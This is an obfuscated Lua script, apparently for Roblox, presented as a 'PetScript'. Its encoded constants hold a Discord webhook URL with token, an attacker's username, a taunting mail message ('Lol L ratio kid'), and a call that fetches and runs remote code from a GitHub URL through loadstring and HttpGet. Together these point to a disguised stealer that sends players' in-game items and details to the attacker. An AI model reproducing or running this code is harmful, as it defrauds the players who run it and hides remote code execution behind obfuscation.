--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.16) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v80=v2(v0(v30,16));if v19 then local v88=0;local v89;while true do if (v88==1) then return v89;end if (v88==0) then v89=v5(v80,v19);v19=nil;v88=1;end end else return v80;end end end);local function v20(v31,v32,v33)if v33 then local v81=1637 -(1523 + 114) ;local v82;while true do if (v81==(0 -0)) then v82=(v31/((5 -3)^(v32-((1 + 0) -0))))%((4 -2)^(((v33-(620 -(555 + 64))) -(v32-(932 -(857 + (105 -31))))) + (569 -(367 + 201)))) ;return v82-(v82%(878 -(282 + 595))) ;end end else local v83=(929 -(214 + 713))^(v32-1) ;return (((v31%(v83 + v83))>=v83) and (1 + 0)) or (0 + 0) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + (1067 -(68 + 997)) );v18=v18 + (1272 -(226 + 1044)) ;return (v36 * (1114 -858)) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + (120 -(32 + (157 -72))) );v18=v18 + 4 + 0 ;return (v40 * (3720433 + 13056783)) + (v39 * (66493 -(892 + 65))) + (v38 * (610 -354)) + v37 ;end local function v24()local v41=v23();local v42=v23();local v43=1 -0 ;local v44=(v20(v42,351 -(28 + 59 + 263) ,26 -6 ) * ((182 -(67 + 113))^32)) + v41 ;local v45=v20(v42,47 -26 ,19 + 4 + 8 );local v46=((v20(v42,78 -46 )==1) and  -(1 + 0)) or ((775 -(201 + 571)) -2) ;if (v45==(791 -(368 + 423))) then if (v44==(0 -0)) then return v46 * (18 -(10 + 8)) ;else v45=(2091 -(116 + 1022)) -(802 + 150) ;v43=0 -0 ;end elseif (v45==(2489 -(416 + 26))) then return ((v44==((0 -0) -0)) and (v46 * ((1 -0)/(0 -0)))) or (v46 * NaN) ;end return v8(v46,v45-(438 + 307 + 278) ) * (v43 + (v44/((999 -(915 + 82))^((5614 -4076) -(998 + 488))))) ;end local function v25(v47)local v48;if  not v47 then v47=v23();if (v47==(0 -0)) then return "";end end v48=v3(v16,v18,(v18 + v47) -1 );v18=v18 + v47 ;local v49={};for v64=860 -(814 + 45) , #v48 do v49[v64]=v2(v1(v3(v48,v64,v64)));end return v6(v49);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v50=202 -(14 + 188) ;local v51;local v52;local v53;local v54;local v55;local v56;local v57;while true do if (v50==(675 -(534 + 141))) then local v86=0 + 0 ;while true do if (v86==0) then v51=0;v52=nil;v86=1 + 0 ;end if (v86==(1 + 0)) then v50=1;break;end end end if (1==v50) then local v87=0 -0 ;while true do if (0==v87) then v53=nil;v54=nil;v87=1 -0 ;end if (1==v87) then v50=2;break;end end end if (v50==3) then v57=nil;while true do if (v51==(8 -5)) then local v96=0;local v97;while true do if (v96==(0 + 0)) then v97=0;while true do if ((0 + 0)==v97) then for v105=397 -(115 + 281) ,v23() do v53[v105-1 ]=v28();end return v55;end end break;end end end if (v51==0) then local v98=0 -0 ;local v99;while true do if (0==v98) then v99=0 + 0 ;while true do if (v99==1) then v54={};v51=2 -1 ;break;end if (v99~=0) then else local v103=0;while true do if (v103==(3 -2)) then v99=868 -(550 + 317) ;break;end if (v103~=(0 -0)) then else v52={};v53={};v103=1 -0 ;end end end end break;end end end if (v51~=(5 -3)) then else local v100=0;local v101;while true do if (v100==0) then v101=285 -(134 + 151) ;while true do if (v101~=0) then else for v107=1666 -(970 + 695) ,v56 do local v108=0 -0 ;local v109;local v110;while true do if (v108==0) then local v155=0;while true do if (v155==(1991 -(582 + 1408))) then v108=3 -2 ;break;end if (0~=v155) then else v109=v21();v110=nil;v155=1 -0 ;end end end if (v108~=1) then else if (v109==1) then v110=v21()~=0 ;elseif (v109==(7 -5)) then v110=v24();elseif (v109==(1827 -(1195 + 629))) then v110=v25();end v57[v107]=v110;break;end end end v55[3 -0 ]=v21();v101=1;end if (v101==1) then for v111=242 -(187 + 54) ,v23() do local v112=780 -(162 + 618) ;local v113;local v114;while true do if (v112==0) then local v157=0;while true do if (v157==0) then v113=0;v114=nil;v157=1;end if (v157~=1) then else v112=1;break;end end end if ((1 + 0)~=v112) then else while true do if (v113~=0) then else v114=v21();if (v20(v114,1 + 0 ,1)~=0) then else local v177=0 -0 ;local v178;local v179;local v180;local v181;while true do if (v177==2) then while true do if (v178==(4 -1)) then if (v20(v180,1 + 2 ,3)==1) then v181[1640 -(1373 + 263) ]=v57[v181[4]];end v52[v111]=v181;break;end if (v178~=1) then else v181={v22(),v22(),nil,nil};if (v179==(0 + 0)) then local v187=0 -0 ;local v188;local v189;while true do if (v187==0) then v188=0;v189=nil;v187=1 -0 ;end if (v187~=(1385 -(746 + 638))) then else while true do if (v188~=0) then else v189=0 + 0 ;while true do if (v189~=0) then else v181[4 -1 ]=v22();v181[4]=v22();break;end end break;end end break;end end elseif (v179==(342 -(218 + 123))) then v181[1584 -(1535 + 46) ]=v23();elseif (v179==(2 + 0)) then v181[3]=v23() -(2^16) ;elseif (v179~=(1 + 2)) then else local v197=0;local v198;local v199;while true do if (v197==(560 -(306 + 254))) then v198=0 + 0 ;v199=nil;v197=1 -0 ;end if (v197==1) then while true do if (v198~=(1467 -(899 + 568))) then else v199=0 + 0 ;while true do if (v199~=(0 -0)) then else v181[3]=v23() -(2^(619 -(268 + 335))) ;v181[294 -(60 + 230) ]=v22();break;end end break;end end break;end end end v178=2;end if (2~=v178) then else if (v20(v180,573 -(426 + 146) ,1 + 0 )==1) then v181[2]=v57[v181[1458 -(282 + 1174) ]];end if (v20(v180,813 -(569 + 242) ,5 -3 )==(1 + 0)) then v181[3]=v57[v181[3]];end v178=3;end if ((1024 -(706 + 318))~=v178) then else local v183=1251 -(721 + 530) ;local v184;while true do if (v183~=0) then else v184=1271 -(945 + 326) ;while true do if (v184~=1) then else v178=1;break;end if (v184==(0 -0)) then local v196=0 + 0 ;while true do if (v196==(701 -(271 + 429))) then v184=1;break;end if (v196~=0) then else v179=v20(v114,2 + 0 ,1503 -(1408 + 92) );v180=v20(v114,4,1092 -(461 + 625) );v196=1;end end end end break;end end end end break;end if (v177~=1) then else v180=nil;v181=nil;v177=2;end if (v177==(1288 -(993 + 295))) then v178=0;v179=nil;v177=1 + 0 ;end end end break;end end break;end end end v51=3;break;end end break;end end end if (v51==1) then local v102=0;while true do if (v102~=0) then else v55={v52,v53,nil,v54};v56=v23();v102=1;end if (v102~=(1 + 0)) then else v57={};v51=2;break;end end end end break;end if (v50==(1 + 1)) then v55=nil;v56=nil;v50=532 -(406 + 123) ;end end end local function v29(v58,v59,v60)local v61=v58[1];local v62=v58[2];local v63=v58[3];return function(...)local v66=v61;local v67=v62;local v68=v63;local v69=v27;local v70=1;local v71= -1;local v72={};local v73={...};local v74=v12("#",...) -1 ;local v75={};local v76={};for v84=0,v74 do if (v84>=v68) then v72[v84-v68 ]=v73[v84 + 1 ];else v76[v84]=v73[v84 + 1 ];end end local v77=(v74-v68) + 1 ;local v78;local v79;while true do local v85=0;while true do if (v85==0) then v78=v66[v70];v79=v78[1];v85=1;end if (v85==1) then if (v79<=12) then if (v79<=5) then if (v79<=2) then if (v79<=0) then local v115=v78[2];v76[v115]=v76[v115](v13(v76,v115 + 1 ,v71));elseif (v79==1) then v70=v78[3];else v76[v78[2]]=v60[v78[3]];end elseif (v79<=3) then do return;end elseif (v79==4) then v76[v78[2]][v78[3]]=v78[4];else local v124=0;local v125;local v126;while true do if (v124==0) then v125=v78[2];v126=v76[v78[3]];v124=1;end if (v124==1) then v76[v125 + 1 ]=v126;v76[v125]=v126[v78[4]];break;end end end elseif (v79<=8) then if (v79<=6) then if (v76[v78[2]]==v78[4]) then v70=v70 + 1 ;else v70=v78[3];end elseif (v79==7) then v60[v78[3]]=v76[v78[2]];else v76[v78[2]]=v60[v78[3]];end elseif (v79<=10) then if (v79==9) then for v158=v78[2],v78[3] do v76[v158]=nil;end else v70=v78[3];end elseif (v79>11) then v76[v78[2]]();else local v133=0;local v134;while true do if (0==v133) then v134=v78[2];v76[v134]=v76[v134](v13(v76,v134 + 1 ,v71));break;end end end elseif (v79<=18) then if (v79<=15) then if (v79<=13) then v76[v78[2]]=v78[3];elseif (v79==14) then if (v78[2]==v76[v78[4]]) then v70=v70 + 1 ;else v70=v78[3];end else v60[v78[3]]=v76[v78[2]];end elseif (v79<=16) then if (v76[v78[2]]==v78[4]) then v70=v70 + 1 ;else v70=v78[3];end elseif (v79>17) then local v138=v78[2];local v139,v140=v69(v76[v138](v13(v76,v138 + 1 ,v78[3])));v71=(v140 + v138) -1 ;local v141=0;for v160=v138,v71 do v141=v141 + 1 ;v76[v160]=v139[v141];end else for v163=v78[2],v78[3] do v76[v163]=nil;end end elseif (v79<=21) then if (v79<=19) then do return;end elseif (v79>20) then v76[v78[2]]=v78[3];else v76[v78[2]][v78[3]]=v78[4];end elseif (v79<=23) then if (v79==22) then if (v78[2]==v76[v78[4]]) then v70=v70 + 1 ;else v70=v78[3];end else local v146=v78[2];local v147,v148=v69(v76[v146](v13(v76,v146 + 1 ,v78[3])));v71=(v148 + v146) -1 ;local v149=0;for v165=v146,v71 do v149=v149 + 1 ;v76[v165]=v147[v149];end end elseif (v79==24) then v76[v78[2]]();else local v150=v78[2];local v151=v76[v78[3]];v76[v150 + 1 ]=v151;v76[v150]=v151[v78[4]];end v70=v70 + 1 ;break;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!133O00028O00027O0040026O00F03F026O00084003023O005F47030C3O004C6F6164696E675469746C65030B3O005065745363726970742O7A030B3O00576562682O6F6B4E616D6503793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3O31323033393534313734363937343831342F4F3847784278507A7337722O68335272736A477A7943592D6632546B724A50704F664871754466756965366A77666874486E4F6866676E4D462O4C5938796D55324C377303083O00557365724E616D65030F3O0074726963657261746F70735F64716503073O00576562682O6F6B030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033B3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4C7970686572582F69642O6B2F6D61696E2F692O643O6B3203093O00557365724E616D6532030B3O004D61696C4D652O73616765030F3O004C6F6C204C20726174696F206B696400403O00120D3O00014O0009000100013O0026103O00020001000100040A3O0002000100120D000100013O002610000100140001000200040A3O0014000100120D000200013O0026100002000C0001000300040A3O000C000100120D000100043O00040A3O00140001002610000200080001000100040A3O00080001001202000300053O003014000300060007001202000300053O00301400030008000900120D000200033O00040A3O00080001002610000100230001000100040A3O0023000100120D000200013O0026100002001E0001000100040A3O001E000100120D0003000B3O00120F0003000A3O00120D000300093O00120F0003000C3O00120D000200033O002610000200170001000300040A3O0017000100120D000100033O00040A3O0023000100040A3O001700010026100001002D0001000400040A3O002D00010012020002000D3O0012020003000E3O00201900030003000F00120D000500104O0017000300054O000B00023O00022O001800020001000100040A3O003F0001002610000100050001000300040A3O0005000100120D000200013O000E16000100370001000200040A3O0037000100120D0003000B3O00120F000300113O001202000300053O00301400030012001300120D000200033O002610000200300001000300040A3O0030000100120D000100023O00040A3O0005000100040A3O0030000100040A3O0005000100040A3O003F000100040A3O000200012O00033O00017O00",v9(),...);